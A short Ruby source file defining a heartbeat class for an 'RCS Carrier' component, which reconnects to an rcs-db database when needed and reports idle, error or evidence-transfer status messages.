require 'rcs-common/trace'
require 'rcs-common/systemstatus'
require 'rcs-common/heartbeat'

module RCS
  module Carrier
    class HeartBeat < RCS::HeartBeat::Base
      component :carrier

      before_heartbeat do
        # if the database connection has gone
        # try to re-login to the database again
        unless DB.instance.connected?
          trace :debug, "heartbeat: try to reconnecto to rcs-db"
          DB.instance.connect!(:carrier)
        end

        # still no luck ?  return and wait for the next iteration
        !!DB.instance.connected?
      end

      after_heartbeat do
        EvidenceTransfer.instance.status = nil
      end

      def status
        EvidenceTransfer.instance.status ? 'ERROR' : super
      end

      def message
        if EvidenceTransfer.instance.status
          EvidenceTransfer.instance.status
        elsif EvidenceTransfer.instance.threads > 0
          "Transferring evidence for #{EvidenceTransfer.instance.threads} instances"
        else
          "Idle"
        end
      end
    end
  end
end
